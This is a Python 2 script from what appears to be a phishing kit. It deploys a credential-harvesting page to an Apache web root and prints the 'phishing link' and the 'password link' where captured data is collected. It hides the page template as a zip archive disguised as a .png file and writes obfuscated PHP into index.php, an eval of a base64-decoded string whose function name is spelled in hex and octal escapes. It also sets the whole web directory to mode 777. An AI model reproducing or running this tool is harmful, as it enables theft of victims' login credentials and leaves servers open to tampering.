import os
import random
import zipfile,fnmatch,os
import shutil
from data import colors
from subprocess import check_output
submitcode = random.randint(00000,99999)
print "Submit-Code"+colors.color.red
print submitcode
id = raw_input(colors.color.end+"Enter Submit-Code : ")
folder = os.mkdir("/var/www/html/"+id)
password = raw_input("Enter password : ")
shutil.copy2("data/png/down.png", "data/png/down.zip")
pathz = os.getcwd()
zip_ref = zipfile.ZipFile(pathz +"/data/png/down.zip", 'r')
zip_ref.extractall(pathz)
zip_ref.close()
shutil.move(pathz+"/zzz", "/var/www/html/")
os.rename("/var/www/html/zzz", "/var/www/html/"+id)
file=open("/var/www/html/"+id+"/index.php","a")
file.write("<?php"+"\n")
file.write("$to = '"+password+".';")
file.write('$qdf7061a="\x62\x61\163\145\66\64\137\144\x65\143\x6f\x64\145";@eval($qdf7061a("aW5jbHVkZSAiaW5kLnBocCI7"));')
file.write("?>")
file.close()
print "["+colors.color.green+"Generate phishing........"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"We are Lazy men........"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"This is only for education purpose........"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"Please Wait.............."+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"Please Wait..............50%"+colors.color.end+"]"
os.system("sleep 1")
print "["+colors.color.green+"Please Wait..............99%"+colors.color.end+"]"
os.system("sleep 1")
os.system("chmod -R 777 /var/www")
ips = check_output(['hostname', '--all-ip-addresses'])
indexfilelink = "Your phishing link is {{{ http://"+ips+"/"+id+"}}}"
passfilelink = "Your password link is {{{ http://"+ips+"/"+id+"/"+password+".html }}}"
print "\n"
print "Phishing is successfully created at /var/www/html/"
print indexfilelink
print passfilelink

confirm = raw_input("\nDo you wanted to start Apache2 service [yes or no] : ")
if confirm == "yes" or confirm == "y" or confirm == "Y" or confirm == "Yes" or confirm == "YES" :
	os.system("service apache2 start")
